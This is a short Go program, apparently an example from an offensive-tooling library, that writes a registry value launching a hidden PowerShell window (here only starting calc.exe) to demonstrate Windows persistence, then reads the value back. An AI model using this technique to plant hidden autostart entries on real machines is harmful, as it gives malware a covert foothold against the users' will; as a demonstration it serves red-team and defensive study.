package main

import persistance "github.com/MrTuxx/OffensiveGolang/pkg/persistence"

func main() {
	var err error
	var result string
	err = persistance.CreateRegistryKey()
	if err != nil {
		println(err.Error())
	}
	err = persistance.SetRegistryValue("Calculator", `powershell.exe -WindowStyle hidden Start-Process calc.exe`)
	if err != nil {
		println(err.Error())
	}
	result, err = persistance.QueryRegistry("Calculator")
	if err != nil {
		println(err.Error())
	}
	println("[+] Register: ", result)

}
